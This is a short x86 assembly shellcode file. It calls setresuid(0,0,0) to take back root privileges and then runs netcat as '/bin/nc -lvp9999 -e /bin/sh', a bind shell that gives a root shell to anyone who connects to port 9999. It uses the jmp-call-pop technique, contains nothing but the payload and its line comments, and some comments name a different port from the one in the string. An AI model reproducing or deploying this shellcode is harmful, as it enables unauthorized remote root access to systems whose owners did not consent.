global _start
_start:
jmp short todo
shellcode:
;from man setresuid: setresuid(uid_t ruid, uid_t euid, uid_t suid)
xor eax, eax 		;Zero out eax
xor ebx, ebx		;Zero out ebx
xor ecx, ecx		;Zero out ecx
cdq			;Zero out edx using the sign bit from eax
mov BYTE al, 0xa4 	;setresuid syscall 164 (0xa4)
int 0x80		;syscall execute
pop esi			;esi contain the string in db
xor eax, eax		;Zero out eax
mov[esi + 7], al	;null terminate /bin/nc
mov[esi +  16], al 	;null terminate -lvp90
mov[esi +  26], al	;null terminate -e/bin/sh
mov[esi +  27], esi	;store address of /bin/nc in AAAA
lea ebx, [esi + 8]	;load address of -lvp90 into ebx
mov[esi +31], ebx	;store address of -lvp90 in BBB taken from ebx
lea ebx, [esi + 17]	;load address of -e/bin/sh into  ebx
mov[esi + 35], ebx	;store address of -e/bin/sh in CCCC taken from ebx
mov[esi + 39], eax 	;Zero out DDDD
mov al, 11		;11 is execve  syscakk number
mov ebx, esi		;store address of  /bin/nc 
lea ecx, [esi + 27]	;load address of ptr to argv[] array
lea edx, [esi + 39] 	;envp[] NULL
int 0x80		;syscall execute 
todo:
call shellcode
db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
;   01234567890123456789012345678901234567890123
